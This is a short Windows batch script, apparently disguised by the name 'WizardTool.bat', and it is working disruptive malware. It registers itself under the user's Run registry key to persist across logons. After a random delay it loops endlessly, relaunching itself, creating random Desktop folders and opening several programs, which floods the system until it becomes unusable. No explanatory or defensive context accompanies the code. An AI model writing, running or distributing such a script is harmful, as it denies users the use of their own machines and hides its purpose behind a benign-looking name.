@echo off

reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "WizardTool.bat" /t REG_SZ /d "\"%~dp0%~nx0\"" /f

:GenerateRandomDelay
set /a "randomDelay=%random% %% 120"
if %randomDelay% lss 1 goto GenerateRandomDelay

timeout /t %randomDelay% /nobreak >nul

:start
start "" "%~f0"
mkdir %userprofile%/Desktop/%random%
mkdir %userprofile%/Desktop/%random%%random%
mkdir %userprofile%/Desktop/%random%%random%%random%
start notepad.exe
start iexplore.exe
start calc.exe
start mspaint.exe
goto start